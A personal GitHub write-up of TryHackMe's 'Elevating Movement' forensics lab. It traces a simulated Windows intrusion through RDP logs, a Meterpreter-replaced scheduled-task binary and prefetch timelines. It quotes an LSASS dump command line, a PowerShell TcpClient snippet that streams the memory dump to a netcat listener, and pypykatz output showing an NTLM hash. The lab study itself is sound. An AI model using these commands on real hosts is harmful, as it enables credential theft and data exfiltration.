<h1 align="center">Elevating Movement</h1>
<p align="center">2025, November 8 - December 30 &nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a> Let´s in investigate the second, Windows part of the Honeynet Collapse from <a href="https://tryhackme.com"> TryHackMe</a>. &nbsp;&nbsp;Access it <a href="https://tryhackme.com/room/elevatingmovement">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/4f91cfbe-466a-4e4b-8290-cd0b87a03617"></p>


<h2>Task 1 . Introduction</h2>
<h3>Meet DeceptiTech</h3>
<p>DeceptiTech is a fast-growing cyber security company specializing in honeypot development and deception technologies. At the heart of their success are DeceptiPots - lightweight, powerful, and configurable honeypots that you can install on any OS and capture every malicious action!<br>

The internal DeceptiTech network is organized around a traditional on-premises Active Directory domain with approximately 50 active users. The product platform, however, is isolated and hosted entirely in the AWS cloud:</p>

<h6 align="center"><img width="700px" src="https://github.com/user-attachments/assets/34793d11-ee28-43ae-a4b0-c2ed81bbd0c6"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<h3>Elevating Movement</h3>
<p>One ordinary morning, DeceptiTech's entire network collapsed. Within minutes, all critical on-premises systems were locked down and encrypted. The IT department hurried to restore backups, while the security team rushed to their SIEM - only to find the backups corrupted and all SIEM data wiped clean.<br>

This room is about the second attack stage (#2 on the network diagram). As part of an external DFIR unit, can you help DeceptiTech perform a full-scope investigation and explain how the attack continued?</p>

<p><em>Answer the question below</em></p>

<p>1.1. Let´s go!<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>No answer needed</code></p>

<br>
<h2>Task 2 . The Challenge</h2>
<h3>Set up your environement</h3>
<p>To successfully complete this room, you'll need to set up your virtual environment. This involves starting the Target Machine, ensuring you're equipped with the necessary tools and access to tackle the challenges ahead.</p>

<h3>Elevating Movement</h3>
<p><em>Hey Emily, when you are done with DeceptiPot deployment, can you take a look at SRV-IT-QA? It became unstable after we replaced the motherboard, so maybe you can debug what's going on there. ~ Matthew<br>

While Emily worked on the issue from a local admin account, the threat actor continued the attack. With the entry point secured and Emily's domain credentials stolen, they now wanted to explore opportunities for privilege escalation. Leveraging your knowledge of Windows forensics, can you uncover the elevating movement?</em></p>

<h6 align="center"><img width="700px" src="https://github.com/user-attachments/assets/6449fe3f-794e-4508-9ffb-ebff35d9c7c6"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6

<p><em>Answer the questions below</em></p>

<br>
<p>2.1. When did the attacker perform RDP login on the server? Answer Format Example: 2025-01-15 19:30:45<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>2025-06-30 16:33:18</code><br>

```bash
:~/ElevatingMovement# nmap -p- -T4 xx.xx.xx.xx
...
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```

```bash
:~/ElevatingMovement# nmap -sC -sV -Pn -p3389,5985 -T4 xx.xx.xx.xx
...PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: DECEPT
|   NetBIOS_Domain_Name: DECEPT
|   NetBIOS_Computer_Name: SRV-IT-QA
|   DNS_Domain_Name: deceptitech.thm
|   DNS_Computer_Name: SRV-IT-QA.deceptitech.thm
|   DNS_Tree_Name: deceptitech.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-26Txx:xx:xx+00:00
| ssl-cert: Subject: commonName=SRV-IT-QA.deceptitech.thm
| Not valid before: 2025-06-19Txx:xx:xx
|_Not valid after:  2025-12-19Txx:xx:xx
|_ssl-date: 2025-10-26Txx:xx:xx+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
```
  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - launch <code>Event Viewer</code><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - select <code>Applications and Service Logs</code> → <code>Microsoft</code> → <code>Windows</code> → <code>TerminalServices-RemoteConnectionManager</code> → <code>Operational</code><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - look for <strong>Event ID</strong> : <code>1149</code> (successfull Windows RDP login) and <strong>IP</strong> : <code>172.16.8.239</code><br>

<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/e834b26e-eeee-4afd-9f81-9929bc18c70c"></p>

<br>
<p>2.2. What is the full path to the binary that was replaced for persistence and privesc?<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>C:\Users\emily.ross\Documents\Coreinfo64.exe</code><br>
  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - launch <code>Task Scheduler</code><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - select <code>Task Scheduler Library</code><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - double-click the task owned by <code>SRV-IT-QA</code><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - click <code>Actions</code><br>

<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/9a935f7a-7f35-4e5a-a9eb-b17eaccb79a3"></p>


<br>
<p>2.3. What is the type or malware family of the replaced binary?<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Meterpreter</code><br>
  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - execute the command line below to get the MD5 hash of the replaced binary<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - navigate to <code>VirusTotal</code>, paste the hash, then hit ENTER<br>

```bash
PS C:\Users\emily.ross\Documents> Get-FileHash "Coreinfo64.exe" -Algorithm MD5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             42050FD1614C70266DDCEF0A419478C8                                       C:\Users\emily.ross\Documents...


PS C:\Users\emily.ross\Documents>
```

<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/4192b652-cd47-4204-be16-448bcff4ad3e"></p>

<br>
<p>2.4. Which full command line was used to dump the OS credentials?<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>pcd.exe /accepteula -ma lsass.exe text.txt</code></p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - remember that the successfull RDP connection took place on <code>2025-06-30</code><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - launch <code>File Explorer</code><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - navigate to <code>Users</code> → <code>Administrator</code> → <code>Documents</code><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - identify 2 directories<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - access <code>20250630</code> updated on <code>2025-06-30</code><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - open <code>PowerShell_transcript.SRV-IT-QA.KSUYD5bK.20250630182641</code><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - decode the Base64 excerpts in the previous file<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - the first one confirms 2.3.´s answer<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - advance and uncover 2.4´s answer<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - hint: save the encoded excerpt as <code>ANSI</code>.<br>

```bash
C:\Users\Administrator\Documents\certutil -decode a.txt decoded.txt
```

```bash
C:\Users\Administrator\Documents\type decoded.txt
```

<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/79ec68d7-6c7b-44e4-8e93-a2134b5c9312"><br>
<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/0c515fbd-0774-4cbd-abf4-fc59af81295a"><br><br>
<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/cf1009ee-d997-47fe-80ca-059a10fcb676"><br><br>
<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/34ba053b-1319-4a67-8c85-df2a96fbf831"><br>
<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/9410fbbf-6a39-499e-bb37-047c098a25ef"><br><br>
<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/378978f9-f0ac-444a-a828-12c3380e8235"><br>
<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/47bb6d22-cf88-46c1-ab1e-a0ec2c043d48"><br>
<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/b1f21d56-ede1-49e2-8a90-99fc827588ee"></p>

<br>
<p>2.5. Using the stolen credentials, when did the attacker perform lateral movement? Answer Format Example: 2025-01-15 19:30:45<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>2025-06-30 19:47:14</code></p>

- execute the command below to generate a .csv file containing....<br>
- launch <code>TimelineExplorer</code> which is in C:\Users\Administrator\Desktop\EZ tools\TimelineExplorer<br>
- analyze considering the date and time discovered in 2.1. reflected in <code>Run Time</code> column<br>

```bash
C:\Users\Administrator\Desktop\PECmd.exe C:\Windows\Prefetch --csv ..\Prefetch --csf analysis.csv
```

<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/f9e1648b-0d5c-4b5f-8ef2-134998425d43"><br>
<img width="600px" hspace="30" src="https://github.com/user-attachments/assets/3484647b-bfcb-49bf-b8f9-19eb17a32780"><br>
<img width="600px" hspace="30" src="https://github.com/user-attachments/assets/9b80c8b4-ddb6-4f4c-8319-e597a05d1dc4"><br>
<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/42ba344d-7bd0-4bbe-b15a-4b9b0e587399"><br>
<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/bbcd75f6-ce5f-4884-8703-1cbed25f7a4d"></p>

<br>
<p>2.6. What is the NTLM hash of matthew.collins' domain password?<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>eb3d2de2f21b31933fb4a4fd7a7d314d</code></p>

<img width="1155" height="557" alt="image" src="https://github.com/user-attachments/assets/6af58666-281e-4efe-911d-5915788efa3d" />

<br>
<br>
<p>

- Install or Locate Pypykatz.<br>To analyze the memory dump, use <strong>pypykatz</strong>.<br>If it is not already in your PATH, you can install it via pip:</p>

```bash
pip3 install pypykatz
```

<p>Note: On the TryHackMe AttackBox, you may need to run it using the full path: <code>~/.local/bin/pypykatz</code>.</p>
<br>

```bash
:~/ElevatingMovement# nc -nvlp 4444 > text.txt.dmp
Listening on 0.0.0.0 4444
```

<br>

```bash
PS C:\Users\Administrator> $file = "C:\Windows\system32\text.txt.dmp"
PS C:\Users\Administrator> $ip = "10.65.64.164"
PS C:\Users\Administrator> $port = 4444
PS C:\Users\Administrator> $client = New-Object System.Net.Sockets.TcpClient($ip, $port)
PS C:\Users\Administrator> $stream = $client.GetStream()
PS C:\Users\Administrator> $bytes = [System.IO.File]::ReadAllBytes($file)
PS C:\Users\Administrator> $stream.Write($bytes, 0, $bytes.Length)
PS C:\Users\Administrator> $stream.Close()
PS C:\Users\Administrator> $client.Close()
PS C:\Users\Administrator>
```

<img width="1299" height="341" alt="image" src="https://github.com/user-attachments/assets/87f3fd06-f05a-44a3-ab87-6f7292c2664f" />

<br>
<br>
<br>

```bash
:~/ElevatingMovement# nc -nvlp 4444 > text.txt.dmp
Listening on 0.0.0.0 4444
Connection received on 10.65.165.167 50336
```

<img width="1333" height="101" alt="image" src="https://github.com/user-attachments/assets/d0de2900-3f18-4c69-93f8-641f408ee1f8" />

<br>
<br>
<br>

```bash
:~/ElevatingMovement# ls
text.txt.dmp
```

<img width="1335" height="81" alt="image" src="https://github.com/user-attachments/assets/d47b778b-4998-4ee8-bd99-da146abe9cd6" />

<br>
<br>
<br>

```bash
:~/ElevatingMovement# pypykatz lsa minidump text.txt.dmp --grep | grep -iE matthew.collins
INFO:pypykatz:Parsing file text.txt.dmp
text.txt.dmp:msv:DECEPT:matthew.collins:eb3d2de2f21b31933fb4a4fd7a7d314d::435e619bc84181f42fd4c01f517878a4efd5fd32::::
text.txt.dmp:msv:DECEPT:matthew.collins:eb3d2de2f21b31933fb4a4fd7a7d314d::435e619bc84181f42fd4c01f517878a4efd5fd32::::
```

<img width="1878" height="117" alt="image" src="https://github.com/user-attachments/assets/c94fde93-a785-425e-896c-4409bcc74d8c" />


<br>
<br>
<br>
<h1 align="center">Completed</h1>

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/6e020295-3f9f-4c14-8062-bf5e540539f5"><br><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/7d88035a-4118-45c7-b9e3-660ad415e8e4"></p>


<h1 align="center">My TryHackMe Journey ・ 2025, December</h1>

<div align="center"><h6>

| Date<br><br>   | Room <br><br> |Streak<br><br>   |Global<br>All Time|Brazil<br>All Time|Global<br>Monthly|Brazil<br>Monthly|Points<br><br>|Rooms<br>Completed|Badges<br><br>|
|:------:|:--------------------------------------|:--------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|
|30      |Hard 🚩 - Elevating Movement                    |14 |     102ⁿᵈ  |     3ʳᵈ    |    4,517ᵗʰ   |       56ᵗʰ     |    135,558  |    1,055    |    84     |
|30      |Medium 🚩 - Binary Heaven                       |14 |     103ʳᵈ  |     3ʳᵈ    |    4,604ᵗʰ   |       56ᵗʰ     |    135,528  |    1,054    |    84     |
|27      |Medium 🚩 - Metamorphosis                       |11 |     101ˢᵗ  |     3ʳᵈ    |    4,966ᵗʰ   |       58ᵗʰ     |    135,348  |    1,053    |    84     |
|26      |Hard 🚩 - The Great Disappearing Act            |10 |     101ˢᵗ  |     3ʳᵈ    |    5,091ˢᵗ   |       62ⁿᵈ     |    135,288  |    1,052    |    84     |
|25      |Medium 🚩 - Profiles                             |9 |     100ᵗʰ  |     3ʳᵈ    |   13,969ᵗʰ   |      156ᵗʰ     |    135,198  |    1,051    |    84     |
|24      |Medium 🔗 - YARA Rules - YARA mean one!          |8 |     100ᵗʰ  |     3ʳᵈ    |   10,263ʳᵈ   |      127ᵗʰ     |    135,168  |    1,050    |    84     |
|24      |Easy 🔗 - Exploitation with cURL - Hoperation Eggsploit|8 |100ᵗʰ |     3ʳᵈ    |   12,804ᵗʰ   |      154ᵗʰ     |    135,144  |    1,049    |    84     |
|24      |Medium 🔗 - Phishing - Phismas Greetings         |8 |     100ᵗʰ  |     3ʳᵈ    |   14,507ᵗʰ   |      174ᵗʰ     |    135,112  |    1,048    |    84     |
|24      |Easy 🔗 - n8n: CVE-2025-68613                    |8 |     102ⁿᵈ  |     3ʳᵈ    |   18,279ᵗʰ   |      205ᵗʰ     |    135,064  |    1,047    |    84     |
|24      |Medium 🔗 - C2 Detection - Command & Carol       |8 |     101ˢᵗ  |     3ʳᵈ    |   17,260ᵗʰ   |      193ʳᵈ     |    135,048  |    1,046    |    84     |
|23      |Easy 🔗 - AWS Security - S3cret Santa            |7 |      99ᵗʰ  |     3ʳᵈ    |   16,068ᵗʰ   |      182ⁿᵈ     |    135,008  |    1,045    |    84     |
|23      |Easy 🔗 - Malware Analysis - Malhare.exe         |7 |      99ᵗʰ  |     3ʳᵈ    |   17,332ⁿᵈ   |      191ˢᵗ     |    134,968  |    1,044    |    84     |
|20      |Medium 🔗 - Containers - DoorDasher's Demise     |4 |     100ᵗʰ  |     3ʳᵈ    |   18,059ᵗʰ   |      206ᵗʰ     |    134,864  |    1,043    |    84     |
|20      |Medium 🔗 - Forensics - Registry Furensics       |4 |     100ᵗʰ  |     3ʳᵈ    |   20,497ᵗʰ   |      239ᵗʰ     |    134,832  |    1,042    |    84     |
|20      |Medium 🔗 - Web Attack Forensics - Drone Alone   |4 |     100ᵗʰ  |     3ʳᵈ    |   21,935ᵗʰ   |      243ʳᵈ     |    134,808  |    1,041    |    84     |
|20      |Easy 🔗 - XSS - Merry XSSMas                     |4 |     100ᵗʰ  |     3ʳᵈ    |   23,069ᵗʰ   |      256ᵗʰ     |    134,792  |    1,040    |    84     |
|20      |Easy 🔗 -  Race Conditions - Toy to The World    |4 |     100ᵗʰ  |     3ʳᵈ    |   24,717ᵗʰ   |      275ᵗʰ     |    134,768  |    1,039    |    84     |
|20      |Medium 🔗 -  SOC Alert Triaging - Tinsel Triage  |4 |     100ᵗʰ  |     3ʳᵈ    |   25,202ⁿᵈ   |      286ᵗʰ     |    134,752  |    1,038    |    84     |
|19      |Medium 🔗 -  ICS/Modbus - Claus for Concern      |3 |     101ˢᵗ  |     3ʳᵈ    |   28,869ᵗʰ   |      337ᵗʰ     |    134,658  |    1,037    |    84     |
|19      |Easy 🔗 -  Passwords - A Cracking Christmas      |3 |     101ˢᵗ  |     3ʳᵈ    |   29,583ʳᵈ   |      340ᵗʰ     |    134,642  |    1,036    |    84     |
|18      |Easy 🔗 -  Prompt Injection - Sched-yule conflict|2 |     101ˢᵗ  |     3ʳᵈ    |   30,518ᵗʰ   |      353ʳᵈ     |    134,626  |    1,035    |    84     |
|18      |Medium 🔗 -  Obfuscation - The Egg Shell File    |2 |     101ˢᵗ  |     3ʳᵈ    |   30,967ᵗʰ   |      358ᵗʰ     |    134,618  |    1,034    |    84     |
|17      |Medium 🔗 - CyberChef - Hoperation Save McSkidy  |1 |     101ˢᵗ  |     3ʳᵈ    |   32,378ᵗʰ   |      374ᵗʰ     |    134,602  |    1,033    |    84     |
|7       |Medium 🔗 - Malware Analysis - Egg-xecutable     |2 |      95ᵗʰ  |     3ʳᵈ    |   11,604ᵗʰ   |      145ᵗʰ     |    134,544  |    1,034    |    84     |
|7       |Easy 🔗 - Network Discovery - Scan-ta Clause     |2 |      95ᵗʰ  |     3ʳᵈ    |   18,575ᵗʰ   |      208ᵗʰ     |    134,522  |    1,033    |    84     |
|7       |Easy 🔗 - React2Shell: CVE-2025-55182            |2 |      95ᵗʰ  |     3ʳᵈ    |   28,593ʳᵈ   |      326ᵗʰ     |    134,474  |    1,032    |    81     |
|6       |Medium 🔗 - IDOR - Santa´s Little IDOR           |1 |      95ᵗʰ  |     3ʳᵈ    |   27,309ᵗʰ   |      328ᵗʰ     |    134,450  |    1,031    |    81     |
|6       |Easy 🔗 - AI in Security - old sAInt nick        |1 |      95ᵗʰ  |     3ʳᵈ    |   41,626ᵗʰ   |      526ᵗʰ     |    134,426  |    1,030    |    81     |
|6       |Medium 🔗 - Splunk Basics - Did you SIEM?        |1 |      95ᵗʰ  |     3ʳᵈ    |   44,647ᵗʰ   |      560ᵗʰ     |    134,410  |    1,029    |    81     |
|6       |Easy 🔗 - Phishing - Merry Clickmas              |1 |      96ᵗʰ  |     3ʳᵈ    |   55,824ᵗʰ   |      674ᵗʰ     |    134,370  |    1,028    |    81     |
|6       |Easy 🔗 - Linux CLI - Shells Bells               |1 |      97ᵗʰ  |     3ʳᵈ    |   53,003ʳᵈ   |      712ⁿᵈ     |    134,354  |    1,027    |    81     |

</h6></div><br>

<p align="center">Global All Time:    102ⁿᵈ<br><img width="250px" src="https://github.com/user-attachments/assets/8b27a078-c83c-423a-9234-d9b3e34edd8e"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/702993ee-0d1b-42ac-94b5-41111022b663"><br><br>
                  Brazil All Time:      3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/32471dd2-11c9-4ee5-a12d-ae7125a0ae4e"><br><br>
                  Global monthly:   4,517ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/bc526c60-38b6-41eb-88a8-abd189bccc39"><br><br>
                  Brazil monthly:      56ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/21ce51df-8402-4b22-b04e-1c2ef25f0c5d"></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
